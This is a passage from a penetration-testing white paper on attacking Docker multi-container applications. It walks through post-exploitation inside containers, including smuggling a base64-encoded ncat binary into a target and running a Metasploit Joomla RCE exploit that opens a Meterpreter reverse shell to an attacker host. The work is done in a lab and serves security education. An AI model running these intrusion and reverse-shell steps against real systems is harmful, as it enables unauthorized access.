Warning: Permanently added ‘172.17.0.3’ (ECDSA) to the list of known hosts.
root@172.17.0.3’s password:
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-25-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Jan 27 21:26:38 2018 from 172.17.0.1
root@2853974e9b1c:~#
IMPLICATIONS FOR ATTACKERS
The implication of this exercise is that an attacker that gains access through conventional exploits against a 
service exposed by a Docker container has now been placed into a situation that is familiar to them: having 
access to another network into which they can pivot. If multiple monolithic container applications are running 
on the same Docker host, and those applications are not running in independent Docker networks (which can be 
configured, but are not the default), then the Docker “bridge” (or other network) can be scanned for other hosts 
and services which administrators and developers may not have expected to be accessible by attackers. This will 
be familiar to attackers, such as penetration testers, as it is similar to other instances in which they move across 
network boundaries (such as movement from external services on public IP addresses to target-internal ranges).
If you try to run through this SSH example without the “inside knowledge” provided by the Docker network and 
Docker port commands on the host, you will get a taste of some of the difficulties an attacker might have “living 
off the land” on compromised container hosts. Containers need only contain the binaries, libraries, and code 
needed to accomplish their goal, usually that of running one application or service. 
Wesley McGrew
HORNECyber.com
15
An Attacker Looks at Docker: Approaching Multi-Container Applications
Often, common command-line tools administrators and attackers alike rely on are not necessary and are omitted 
from Docker images. Attackers with experience in post-exploitation on embedded systems may already be 
experienced in working with minimal available tools in compromised targets.
EXAMPLE: POST-EXPLOITATION INSIDE
CONTAINERS
MOTIVATION
In our SSH example, the attacker, without knowledge of the Docker bridge network layout, would want to 
progress with the following goals:
• 
Compromise the external service (in this case, SSH’ing in)
• 
Identify the internal network information (i.e. What is my IP and netmask?)
• 
Scan the internal network for other containers
• 
Scan containers for services
IDENTIFYING NETWORK INFORMATION
The first hurdle an attacker will run into will be the simple matter of identifying the local IP address. Observe:
root@819e5ea65007:~# ifconfig
-bash: ifconfig: command not found
root@819e5ea65007:~# ip a
-bash: ip: command not found
If your container has network access, and you don’t mind increasing your footprint considerably, you could 
install packages you need. In this case, we add the package containing the “ip” command:
root@819e5ea65007:~# apt install iproute2
root@819e5ea65007:~# ip a
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
57: eth0@if58:  mtu 1500 qdisc noqueue 
state UP group default
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
Wesley McGrew
HORNECyber.com
16
An Attacker Looks at Docker: Approaching Multi-Container Applications
If this isn’t an option, you can also extract the information from the /proc file system:
root@819e5ea65007:~# cat /proc/net/tcp    
 sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt
uid  timeout inode
  0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     
0        0 36420849 1 0000000000000000 100 0 0 10 0
  1: 020011AC:0016 010011AC:B4D8 01 00000000:00000000 02:0005A43A 00000000     
0        0 36421136 4 0000000000000000 20 5 25 10 -1                                                                 
root@819e5ea65007:~# cat /proc/net/route 
Iface  Destination  Gateway    Flags   RefCnt   Use     Metric Mask      MTU
 Window IRTT  
eth0  00000000    010011AC   0003    0         0     0       00000000  0
 00         
eth0  000011AC    00000000   0001    0         0     0       0000FFFF  0
 00                                                                                                                         
This output presents TCP connections and routing information in little-endian hexadecimal values. In the above 
output, the values that have been marked in bold can be decoded to identify network information:
• 
IP Address: 020011ACh → AC.11.00.02 → 172.17.0.2
• 
Network: 000011ACh → 172.17.0.0
• 
Netmask: 0000FFFFh → 255.255.0.0
• 
Default gateway (host): 010011ACh → 172.17.0.1
LOADING TOOLS INTO COMPROMISED CONTAINERS
You can explore a common minimal post-exploitation container environment by looking at the base “alpine” 
image. Alpine Linux is used by many Docker images that aim towards small, minimal container environments. 
Most of the command-line tools available within it are provided by a single BusyBox binary.
wes@br:~$ docker pull alpine
Using default tag: latest
latest: Pulling from library/alpine
ff3a5c916c92: Already exists
Digest: 
sha256:7df6db5aa61ae9480f52f0b3a06a140ab98d427f86d8d5de0bedab9b8df6b1c0
Status: Downloaded newer image for alpine:latest
wes@br:~$ docker run -it alpine /bin/sh
/ # echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
/ # ls -al /usr/bin
total 184
drwxr-xr-x    2 root     root          4096 Jan  9 19:37 .
drwxr-xr-x    7 root     root          4096 Jan  9 19:37 ..
lrwxrwxrwx    1 root     root            12 Jan  9 19:37 [ -> /bin/busybox
Wesley McGrew
HORNECyber.com
17
An Attacker Looks at Docker: Approaching Multi-Container Applications
lrwxrwxrwx    1 root     root            12 Jan  9 19:37 [[ -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan  9 19:37 awk -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan  9 19:37 basename -> /bin/
busybox
Interestingly, while the base Ubuntu container does not contain ifconfig or ip, Alpine does include ifconfig. 
To accomplish much else, however, you’ll need to install from the “apk” repositories or transfer in binaries/
scripts yourself. As an example of the former, the following two commands will allow you to install an SSH client:
/ # apk update
fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/community/x86_64/APKINDEX.
tar.gz
v3.7.0-56-g2e8e7a0d34 [http://dl-cdn.alpinelinux.org/alpine/v3.7/main]
v3.7.0-58-g26701b74f8 [http://dl-cdn.alpinelinux.org/alpine/v3.7/community]
OK: 9044 distinct packages available
/ # apk add openssh
(1/6) Installing openssh-keygen (7.5_p1-r8)
(2/6) Installing openssh-client (7.5_p1-r8)
(3/6) Installing openssh-sftp-server (7.5_p1-r8)
(4/6) Installing openssh-server-common (7.5_p1-r8)
(5/6) Installing openssh-server (7.5_p1-r8)
(6/6) Installing openssh (7.5_p1-r8)
Executing busybox-1.27.2-r7.trigger
OK: 8 MiB in 17 packages
/ #
For transferring your own tools, there is a BusyBox version of wget available in the base Alpine container. Other 
distributions commonly used to build Docker images do not contain easy-to-use tools for file transfer in their 
bare-bones forms. For these systems (including Ubuntu, Debian, and CentOS), there are at least three options 
for bootstrapping execution of arbitrary binaries:
• 
Update package repositories and install the needed tools. This requires network access to the repositories 
and a willingness to have that specific impact/footprint on the running container.
• 
Utilize the language tools that have been installed to support the application/module/service that the Docker 
container is running. For example, if the purpose of the Docker container is to run Python code, the standard 
Python libraries can be used from a script or the interactive Python console to download and run arbitrary 
binaries.
• 
Encode and paste in a statically-linked (or correctly dynamic linked, if you create it specifically for the target 
container) binary that will either accomplish the task or bootstrap more transfers.
Wesley McGrew
HORNECyber.com
18
An Attacker Looks at Docker: Approaching Multi-Container Applications
We can demonstrate the last option using a statically compiled version of the “ncat” netcat variant, available 
from a useful repository of statically compiled binaries (https://github.com/andrew-d/static-binaries). All of the 
base distribution images discussed so far have the Base-64 command installed, which allows us to translate a 
binary into printable ASCII characters that we can then copy and paste into a file on the target container, and 
decode back into an executable binary.
On the attacker’s machine, we prepare the text of the ncat binary:
wes@br:~/Downloads$ base64 ncat > ncat_test.txt
If we open the binary in a text editor, we see many lines of Base-64 encoded text:
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAkilAAAAAAABAAAAAAAAAAHh0LAAAAAAAAAAAAEAAOAAD
AEAAEAAPAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA1DcrAAAAAADUNysAAAAAAAAA
……
AAAAAAAAAAEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAF0LAAAAAAAcQAAAAAAAAAAAAAAAAAAAAEA
AAAAAAAAAAAAAAAAAAA=
We can select this text, copy it, and paste it into a file on the target container from a shell running on that 
container. We then mark the file as executable and demonstrate that we have a working ncat binary on the target 
container:
root@9c9746bc6223:/# base64 -d ncat_text.txt > ./ncat
root@9c9746bc6223:/# chmod 755 ncat
root@9c9746bc6223:/# ./ncat
Ncat: You must specify a host to connect to. QUITTING.
EXPLOITING THE OUTER SURFACE OF A 
MULTI-CONTAINER APPLICATION
INTRODUCTION
The nature of the vulnerability that allows us access to the container-based application might provide us the 
foothold we need to explore the remainder of the application. Remote code execution vulnerabilities, for example, 
often give us the opportunity to transfer a payload to the target machine that is useful to us. For this section’s 
example, we will use a vulnerability present in an older version of Joomla, still available in some publicly 
accessible Docker Hub repositories, to demonstrate.
Wesley McGrew
HORNECyber.com
19
An Attacker Looks at Docker: Approaching Multi-Container Applications
VALUE IN LAB ENVIRONMENTS
Docker can be useful for attackers who wish to experiment and train with specific vulnerable versions of target 
applications. Traditionally, this is a time-consuming process that involves creating a virtual environment for 
the application, complete with its idiosyncratic dependencies and installation procedures. As time and version 
history march on, it can be increasingly difficult to recreate the circumstances of an older vulnerability.
On the publicly-accessible Docker Hub, images are frequently “tagged” by version number, and it is often 
possible to find an image that bundles up everything necessary to get a specific version of an application up 
and running very quickly. Sometimes these exist in the tags of “official” Docker images for an application. 
Sometimes it is possible to identify “one-off” unofficial images created and made public by ordinary Docker 
users. In the case of this section’s example, we have pulled and followed setup instructions for an unofficial 
(and vulnerable) version of Joomla[14], then committed the configured and running copy to the local image list 
as “joomla_target”.
VULNERABILITIES BROUGHT INTO AND CARRIED ALONG IN CONTAINERS
The availability of ready-made Docker images, both official and unofficial, represent a convenience for developers 
and administrators. Unfortunately, this convenience can also lead to a situation where a running Docker container 
lags in security updates while the underlying image waits to be updated by the administrator/developer, or in 
the time that it takes for a new image to be built. For official images, a process may be automated to keep the 
Docker Hub image up-to-date, but for unofficial images, a patched version may or may not ever be created.
We can test exploitation by running our committed, vulnerable image of Joomla as follows, on the default 
“bridge” network. TCP port 80 on the target container is forwarded to port 80 on the host, and after this 
command we can access the installed Joomla instance at http://localhost/ :
wes@br:~$ docker run -d -p 80:80 joomla_target
1c33421c5d24308f9bd22a895a8a3bdee9638aaa71d3f4b82123eb113b4a1efc
In this demonstration, we’ll use Metasploit’s joomla_http_header_rce exploit against the target 
container:
msf > use exploit/multi/http/joomla_http_header_rce
msf exploit(multi/http/joomla_http_header_rce) > set RHOST localhost
RHOST => localhost
msf exploit(multi/http/joomla_http_header_rce) > set payload php/
meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(multi/http/joomla_http_header_rce) > set LHOST 192.168.2.177
LHOST => 192.168.2.177
msf exploit(multi/http/joomla_http_header_rce) > exploit
[*] Started reverse TCP handler on 192.168.2.177:4444
[*] localhost:80 - Sending payload ...
Wesley McGrew
HORNECyber.com
20
An Attacker Looks at Docker: Approaching Multi-Container Applications
[*] Sending stage (37543 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (192.168.2.177:4444 -> 172.17.0.2:40052) at 
2018-01-30 04:24:05 +0000
meterpreter > sysinfo
Computer    : 1c33421c5d24
OS          : Linux 1c33421c5d24 4.13.0-25-generic #29-Ubuntu SMP Mon Jan 8 
21:14:41 UTC 2018 x86_64
Meterpreter : php/linux
meterpreter >
Because Docker has become popular primarily within the past few years, an image is likely to have been 
created during that time, drastically reducing the chances of an older, known vulnerability being present in a 
containerized application/service. While this property limits the selection of exploits that might show promise 
against container-based applications, it should be noted that the “front-end” of multi-container applications 
are likely to be parts written by internal or contracted teams for the end customer, and thus more likely to 
be unaudited and contain typical web application vulnerabilities than widely used services that support that 
code. In the experiences of the author’s penetration testing teams, the team members are always excited about 
the prospect of attacking “custom”, “internal”, “contracted”, or “niche” web applications found on client 
networks. At any rate, vulnerabilities in open source and commonly used supporting services/frameworks are not 
likely to stop being discovered and exploited either. The movement of an operation from the outside a multi-
container application to the insides of that application should not be surprising to anyone involved in attacking 
or defending those applications.
Now that we have discussed an approach to attacking multi-container applications and demonstrated some of 
the mechanics in isolation, we can mock up a more complete operation.
EXAMPLE: POST-EXPLOITATION OF A 
MULTI-CONTAINER APPLICATION
INTRODUCTION
The Docker Example Voting App is often used in demonstration and tutorials of Docker and Docker Compose. 
The application is made up of multiple containers that provide services for each other with the overall goal 
of providing interfaces for voting and viewing results in a simple poll. The individual containers contain code 
written in a variety of languages and using a couple off-the-shelf open source services. The containers include: